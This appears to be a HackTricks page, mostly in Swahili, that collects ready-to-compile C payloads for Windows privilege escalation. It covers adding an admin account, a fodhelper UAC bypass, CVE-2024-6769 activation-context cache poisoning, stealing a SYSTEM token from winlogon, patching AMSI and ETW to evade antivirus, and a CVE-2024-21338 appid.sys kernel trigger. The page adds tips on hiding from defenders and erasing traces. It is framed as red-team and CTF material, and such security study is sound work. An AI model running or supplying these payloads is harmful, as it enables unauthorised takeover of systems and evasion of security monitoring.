# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unakusanya **vidokezo vidogo, vinavyojitegemea vya C** ambavyo vinasaidia wakati wa Windows Local Privilege Escalation au post-exploitation. Kila payload imeundwa ili kuwa rahisi kunakili-na-kubandika, inahitaji tu Windows API / C runtime, na inaweza kukusanywa kwa kutumia `i686-w64-mingw32-gcc` (x86) au `x86_64-w64-mingw32-gcc` (x64).

> ⚠️ Payload hizi zinadhani kuwa mchakato tayari una angalau vibali vinavyohitajika kutekeleza hatua (kwa mfano `SeDebugPrivilege`, `SeImpersonatePrivilege`, au mazingira ya medium-integrity kwa ajili ya UAC bypass). Zimetengenezwa kwa ajili ya **red-team or CTF settings** ambapo kutumia udhaifu kumefikisha arbitrary native code execution.

---

## Ongeza mtumiaji wa msimamizi wa ndani
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Wakati binary ya kuaminika **`fodhelper.exe`** inapoendeshwa, inachunguza njia ya registry iliyo hapa chini **bila kuchuja kitenzi `DelegateExecute`**. Kwa kuweka amri yetu chini ya funguo hiyo, mshambuliaji anaweza kupita UAC *bila* kuacha faili kwenye diski.

*Njia ya registry iliyoulizwa na `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PoC ndogo inayofungua `cmd.exe` yenye ruhusa za juu:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Imethibitishwa kwenye Windows 10 22H2 na Windows 11 23H2 (maboresho ya Julai 2025). Bypass bado inafanya kazi kwa sababu Microsoft haijarekebisha ukosefu wa ukaguzi wa uadilifu kwenye njia ya `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning bado inafanya kazi dhidi ya matoleo ya Windows 10/11 yaliyopachwa kwa sababu `ctfmon.exe` inaendesha kama high-integrity trusted UI process inayopakia kwa furaha kutoka kwenye caller’s impersonated `C:` drive na kutumia tena redirections za DLL ambazo `CSRSS` imeweka kwenye cache. Matumizi mabaya yanaenda kama ifuatavyo: re-point `C:` kwenye storage inayodhibitiwa na attacker, drop trojanized `msctf.dll`, launch `ctfmon.exe` kupata high integrity, kisha muulize `CSRSS` kuhifadhi manifest inayorudisha (redirects) DLL inayotumika na auto-elevated binary (mfano, `fodhelper.exe`) ili uzinduzi unaofuata urithi payload yako bila UAC prompt.

Mfumo wa vitendo:
1. Tengeneza mti bandia wa `%SystemRoot%\System32` na nakili binary halali unayopanga kuiba (mara nyingi `ctfmon.exe`).
2. Tumia `DefineDosDevice(DDD_RAW_TARGET_PATH)` kuremapa `C:` ndani ya mchakato wako, ukihifadhi `DDD_NO_BROADCAST_SYSTEM` ili mabadiliko yabaki ya ndani.
3. Drop DLL yako + manifest kwenye mti bandia, piga simu `CreateActCtx/ActivateActCtx` kusukuma manifest kwenye activation-context cache, kisha anzisha auto-elevated binary ili itatue DLL iliyoredirect moja kwa moja kwenye shellcode yako.
4. Futa kiingizo cha cache (`sxstrace ClearCache`) au reboota baada ya kumaliza ili kufuta alama za attacker.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Ushauri wa usafi: baada ya popping SYSTEM, ita `sxstrace Trace -logfile %TEMP%\sxstrace.etl` ikifuatiwa na `sxstrace Parse` wakati wa kujaribu—ikiwa unaona jina la manifest yako kwenye log, watetezi wanaweza pia, hivyo badilisha njia kila mara.

---

## Anzisha shell ya SYSTEM kupitia kuiga tokeni (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Ikiwa mchakato wa sasa una **zote mbili** `SeDebug` na `SeImpersonate` privileges (kawaida kwa akaunti nyingi za huduma), unaweza kuiba tokeni kutoka kwa `winlogon.exe`, kuiga, na kuanzisha mchakato uliopandishwa hadhi:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Kwa maelezo ya kina kuhusu jinsi hiyo inavyofanya kazi angalia:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patch ya In-Memory ya AMSI & ETW (Defence Evasion)
Wengi wa engines za AV/EDR za kisasa hutegemea **AMSI** na **ETW** kukagua tabia hatarishi. Kufanya patch kwa interfaces zote mapema ndani ya process ya sasa kunazuia script-based payloads (mfano PowerShell, JScript) zisichunguzwe.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Kibadilisho kilicho hapo juu ni cha mchakato pekee; kuanzisha PowerShell mpya baada ya kukikimbia kitatekelezwa bila ukaguzi wa AMSI/ETW.*

---

## Tengeneza mwana kama Protected Process Light (PPL)
Ombia kiwango cha ulinzi cha PPL kwa mwana wakati wa kuunda ukitumia `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Hii ni API iliyodokumentishwa na itafanikiwa tu ikiwa picha lengwa imesainiwa kwa daraja la signer uliombwa (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Viwango vinavyotumika zaidi:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Thibitisha matokeo kwa Process Explorer/Process Hacker kwa kuangalia safu ya Protection.

---

## Local Service -> Kernel kupitia `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` inatoa device object (`\\.\\AppID`) ambalo IOCTL ya maintenance ya smart-hash inakubali function pointers zinazotolewa na mtumiaji wakati wowote muomba anapotekelezwa kama `LOCAL SERVICE`; Lazarus inatumia hayo kuzuia PPL na kupakia arbitrary drivers, hivyo red teams zinapaswa kuwa na trigger tayari kwa matumizi ya maabara.

Vidokezo vya operesheni:
- Unahitaji bado token ya `LOCAL SERVICE`. Iibi kutoka kwa `Schedule` au `WdiServiceHost` ukitumia `SeImpersonatePrivilege`, kisha fanya impersonation kabla ya kugusa device ili ukaguzi wa ACL upite.
- IOCTL `0x22A018` inatarajia struct ambayo ina callback pointers mbili (query length + read function). Elekeza zote mbili kwa user-mode stubs ambazo zinaunda token overwrite au zinapanga map ring-0 primitives, lakini weka buffers ziwe RWX ili KernelPatchGuard isikose mwendo katikati ya chain.
- Baada ya mafanikio, toka kwenye impersonation na rudisha device handle; watetezi sasa wataangalia handles zisizotarajiwa za `Device\\AppID`, hivyo ifunge mara moja mara tu ufikiaji umepatikana.

<details>
<summary>C - Mfano wa trigger kwa matumizi mabaya ya `appid.sys` Smart-Hash</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Marekebisho madogo kwa build iliyotumika kama silaha: tenga sehemu ya RWX kwa `VirtualAlloc`, nakili token duplication stub yako huko, weka `KernelThunk = section`, na mara `DeviceIoControl` itakaporejea utakuwa SYSTEM hata chini ya PPL.

---

## Marejeo
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – mzalishaji mdogo wa mchakato wa PPL: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
